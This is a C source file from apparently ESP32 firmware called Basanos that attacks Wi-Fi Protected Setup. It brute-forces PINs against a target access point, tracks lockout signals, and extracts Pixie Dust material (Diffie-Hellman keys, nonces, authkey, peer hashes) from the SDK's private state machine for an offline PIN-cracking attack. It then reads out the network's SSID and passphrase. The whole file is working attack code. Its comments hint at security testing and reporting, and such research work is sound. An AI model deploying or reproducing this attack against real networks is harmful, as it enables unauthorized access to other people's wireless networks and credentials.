/* Basanos — WPS PIN recovery against the locked target.
 *
 * The radio work is done by the SDK's own WPS enrollee. That is deliberate:
 * the exchange involves Diffie-Hellman, four HMAC-derived keys and an AES key
 * wrap, and a hand-rolled version of it would be a large amount of subtle
 * cryptographic code whose failure mode is a silent wrong answer.
 *
 * What is NOT in the SDK is any way to see the values inside that exchange,
 * and Pixie Dust is made entirely of them. So this file reaches into the
 * supplicant's WPS state machine through its own accessor and copies out the
 * nonces, public keys and hashes after the exchange has passed M4.
 *
 * That is a private interface and it is treated as one: every field is copied
 * under a length check, a missing state machine is an ordinary negative
 * result rather than a crash, and nothing here assumes the exchange got as far
 * as it hoped.
 *
 * SPDX-License-Identifier: MIT
 */
#include "wpsatk.h"

#include "esp_wifi.h"
#include "esp_wps.h"
#include "esp_event.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"

#include <string.h>
#include <stdio.h>

/* The supplicant's private WPS state machine.
 *
 * These are private headers with no public equivalent, and they are INCLUDED
 * rather than mirrored by hand. The first version of this file copied the
 * struct layouts out by eye and omitted the three leading members of
 * struct wps_data (wps, registrar, er) -- every field was then read 12 bytes
 * out, which turned dh_pubkey_e into a pointer built from hash bytes and
 * dereferenced it. Letting the compiler read the real declaration makes that
 * class of mistake impossible rather than merely unlikely.
 *
 * The include paths come from main/CMakeLists.txt. If a future IDF moves these
 * headers the build BREAKS, which is the point: a loud failure beats a silent
 * wrong answer in a tool whose output goes into a report. */
#include "wps/wps_i.h"
#include "utils/wpabuf.h"
#include "esp_wps_i.h"

static const char *TAG = "bas_wps";

/* WPS_NONCE_LEN, WPS_HASH_LEN and WPS_AUTHKEY_LEN come from the SDK's own
 * wps_defs.h via the includes above. Local copies were deleted: they happened
 * to hold the right values, and would have silently kept holding them after
 * the SDK changed. */

static EventGroupHandle_t s_ev;
#define EV_SUCCESS  BIT0
#define EV_FAILED   BIT1
#define EV_TIMEOUT  BIT2

static bas_wpsatk_result_t *s_active;

const char *bas_wpsatk_state_name(bas_wpsatk_state_t s)
{
    switch (s) {
    case BAS_WPSATK_RUNNING:   return "running";
    case BAS_WPSATK_GOT_PIN:   return "PIN ACCEPTED";
    case BAS_WPSATK_LOCKED:    return "AP locked out";
    case BAS_WPSATK_EXHAUSTED: return "exhausted";
    case BAS_WPSATK_NO_WPS:    return "no WPS negotiation";
    default:                   return "idle";
    }
}

static void on_wps(void *arg, esp_event_base_t base, int32_t id, void *data)
{
    (void)arg; (void)base;
    switch (id) {
    case WIFI_EVENT_STA_WPS_ER_SUCCESS: {
        wifi_event_sta_wps_er_success_t *e =
            (wifi_event_sta_wps_er_success_t *)data;
        if (s_active != NULL && e != NULL && e->ap_cred_cnt > 0) {
            /* Several credentials: the SDK passes them in the event. */
            size_t n = strnlen((const char *)e->ap_cred[0].ssid, 32);
            memcpy(s_active->ssid, e->ap_cred[0].ssid, n);
            s_active->ssid[n] = '\0';
            n = strnlen((const char *)e->ap_cred[0].passphrase, 64);
            memcpy(s_active->passphrase, e->ap_cred[0].passphrase, n);
            s_active->passphrase[n] = '\0';
            s_active->have_cred = true;
        } else if (s_active != NULL) {
            /* ONE credential -- the ordinary access point -- and the SDK posts
             * this event with NO data at all.
             *
             * esp_wps.c:1345 says why: "For only one AP credential don't send
             * event data, wps_finish() has already set the config. This is for
             * backward compatibility." Reading only the event therefore missed
             * the credential on every normal AP, and the device reported a
             * recovered passphrase as "the AP did not return a credential" --
             * the headline feature silently failing at the last step.
             *
             * The credential is in the state machine, where wps_finish() put
             * it. Neither field is NUL-terminated and both lengths come from
             * the AP, so both are clamped. */
            struct wps_sm *sm = wps_sm_get();
            if (sm != NULL && sm->ap_cred_cnt > 0) {
                const struct wps_credential *c = &sm->creds[0];

                size_t sn = c->ssid_len;
                if (sn > sizeof(s_active->ssid) - 1u) {
                    sn = sizeof(s_active->ssid) - 1u;
                }
                memcpy(s_active->ssid, c->ssid, sn);
                s_active->ssid[sn] = '\0';

                size_t kn = c->key_len;
                if (kn > sizeof(s_active->passphrase) - 1u) {
                    kn = sizeof(s_active->passphrase) - 1u;
                }
                memcpy(s_active->passphrase, c->key, kn);
                s_active->passphrase[kn] = '\0';

                s_active->have_cred = (kn > 0u);
            }
        }
        xEventGroupSetBits(s_ev, EV_SUCCESS);
        break;
    }
    case WIFI_EVENT_STA_WPS_ER_FAILED: {
        wifi_event_sta_wps_fail_reason_t *r =
            (wifi_event_sta_wps_fail_reason_t *)data;
        /* M2D is the AP saying "this registrar is not for me". A run of them
         * is what lockout looks like from the outside, and it is the signal
         * to stop rather than keep spending attempts. */
        if (s_active != NULL && r != NULL && *r == WPS_FAIL_REASON_RECV_M2D) {
            s_active->m2d++;
        }
        xEventGroupSetBits(s_ev, EV_FAILED);
        break;
    }
    case WIFI_EVENT_STA_WPS_ER_TIMEOUT:
        xEventGroupSetBits(s_ev, EV_TIMEOUT);
        break;
    default:
        break;
    }
}

/* Harvest the Pixie Dust material out of the live WPS exchange.
 *
 * Valid only immediately after an exchange that reached M4, and before
 * esp_wifi_wps_disable() frees the state machine. The lengths are still
 * checked rather than trusted -- the AP chooses what it sends, and a DH key
 * that is not 192 bytes means the exchange is not the one this solver
 * understands. */
bool bas_wpsatk_material(bas_pixie_in_t *out)
{
    if (out == NULL) {
        return false;
    }
    memset(out, 0, sizeof(*out));

    struct wps_sm *sm = wps_sm_get();
    if (sm == NULL || sm->wps == NULL) {
        return false;
    }
    const struct wps_data *d = sm->wps;

    if (d->dh_pubkey_e == NULL || d->dh_pubkey_r == NULL) {
        return false;                 /* never got past M2 */
    }
    size_t ne = wpabuf_len(d->dh_pubkey_e);
    size_t nr = wpabuf_len(d->dh_pubkey_r);
    if (ne != BAS_PIXIE_DH_LEN || nr != BAS_PIXIE_DH_LEN) {
        ESP_LOGW(TAG, "DH key length %u/%u, expected %d — layout drift?",
                 (unsigned)ne, (unsigned)nr, BAS_PIXIE_DH_LEN);
        return false;
    }

    memcpy(out->pke,     wpabuf_head(d->dh_pubkey_e), BAS_PIXIE_DH_LEN);
    memcpy(out->pkr,     wpabuf_head(d->dh_pubkey_r), BAS_PIXIE_DH_LEN);
    memcpy(out->authkey, d->authkey,    WPS_AUTHKEY_LEN);
    memcpy(out->enonce,  d->nonce_e,    WPS_NONCE_LEN);
    memcpy(out->rnonce,  d->nonce_r,    WPS_NONCE_LEN);
    memcpy(out->rhash1,  d->peer_hash1, WPS_HASH_LEN);
    memcpy(out->rhash2,  d->peer_hash2, WPS_HASH_LEN);

    /* An all-zero authkey or peer hash means the exchange never reached the
     * point where they are filled. Reporting that as material would send the
     * solver looking for a PIN in a buffer of zeroes and, worse, find one. */
    bool any = false;
    for (int i = 0; i < WPS_HASH_LEN; i++) {
        if (out->rhash1[i] != 0u || out->authkey[i] != 0u) {
            any = true;
            break;
        }
    }
    return any;
}

esp_err_t bas_wpsatk_try(uint32_t pin, uint32_t timeout_ms,
                         bas_wpsatk_result_t *out)
{
    if (out == NULL) {
        return ESP_ERR_INVALID_ARG;
    }
    if (s_ev == NULL) {
        s_ev = xEventGroupCreate();
        if (s_ev == NULL) {
            return ESP_ERR_NO_MEM;
        }
        esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID,
                                            on_wps, NULL, NULL);
    }

    esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PIN);
    snprintf(cfg.pin, sizeof(cfg.pin), "%08u", (unsigned)(pin % 100000000u));

    s_active     = out;
    out->state   = BAS_WPSATK_RUNNING;
    out->attempts++;
    xEventGroupClearBits(s_ev, EV_SUCCESS | EV_FAILED | EV_TIMEOUT);

    esp_err_t rc = esp_wifi_wps_enable(&cfg);
    if (rc != ESP_OK) {
        s_active = NULL;
        return rc;
    }
    rc = esp_wifi_wps_start(0);
    if (rc != ESP_OK) {
        esp_wifi_wps_disable();
        s_active = NULL;
        return rc;
    }

    EventBits_t bits = xEventGroupWaitBits(s_ev,
                                           EV_SUCCESS | EV_FAILED | EV_TIMEOUT,
                                           pdTRUE, pdFALSE,
                                           pdMS_TO_TICKS(timeout_ms));

    /* Harvest BEFORE disabling: esp_wifi_wps_disable frees the state machine,
     * and with it every value the offline attack is made of. */
    if (!out->have_material && bas_wpsatk_material(&out->material)) {
        out->have_material = true;
    }

    esp_wifi_wps_disable();
    s_active = NULL;

    if ((bits & EV_SUCCESS) != 0u) {
        out->state = BAS_WPSATK_GOT_PIN;
        out->pin   = pin;
        return ESP_OK;
    }
    if ((bits & EV_TIMEOUT) != 0u || bits == 0u) {
        out->state = BAS_WPSATK_NO_WPS;
        return ESP_ERR_TIMEOUT;
    }
    out->state = BAS_WPSATK_RUNNING;
    return ESP_FAIL;
}
